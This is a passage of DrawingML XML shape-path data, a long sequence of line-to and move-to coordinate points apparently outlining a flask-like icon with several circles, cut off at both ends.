                    <a:pt x="6860" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="1248"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="1651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6567" y="2092"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="3192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="4843"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="5393"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6714" y="5540"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8915" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="7337"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="7154"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6750" y="6787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="7227"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2789" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="7044"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="6640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="6457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="6383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="6310"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="5686"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="1505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="1211"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="1028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="478"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="441"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6090" y="8071"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6127" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6127" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5980" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5760" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6017" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="8071"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="5907" y="7630"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5797" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5687" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5577" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5430" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5467" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5650" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="8658"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6457" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6384" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6310" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5907" y="7630"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4476" y="9134"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4513" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4256" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4183" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4219" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4403" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="9134"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7741" y="9391"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7814" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7814" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7557" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7301" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7631" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="9391"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4439" y="8658"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4293" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3779" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4036" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4843" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="9354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4880" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="8878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="8768"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="8658"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="7447" y="8951"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7337" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6934" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="9758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6824" y="9905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6897" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8108" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9795"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8291" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8218" y="9318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8144" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7998" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8988"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7851" y="8951"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6970" y="7227"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7227" y="7300"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7741" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8658" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="8071"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="9648"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="9868"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="10015"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10749" y="10235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="10345"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8328" y="10455"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7374" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="10712"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="625" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="10602"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="10565"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="588" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="9685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1542" y="9575"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2128" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="9098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1872" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1725" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1395" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1798" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1835" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1945" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2092" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2055" y="8181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="7704"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3046" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="7851"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3376" y="7924"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="7961"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5797" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="7264"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6494" y="7227"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="4036" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3816" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3596" y="74"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3119" y="404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2972" y="771"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3009" y="991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3156" y="1285"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="1358"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3706" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3853" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4073" y="1395"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="1578"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="2532"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="3449"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3926" y="5283"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3963" y="5503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3742" y="5613"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="5723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899" y="6347"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605" y="6677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2239" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1908" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1285" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="698" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="10492"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="10675"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="368" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="551" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="771" y="11262"/>
                  </a:lnTo>
                  <a:lnTo>
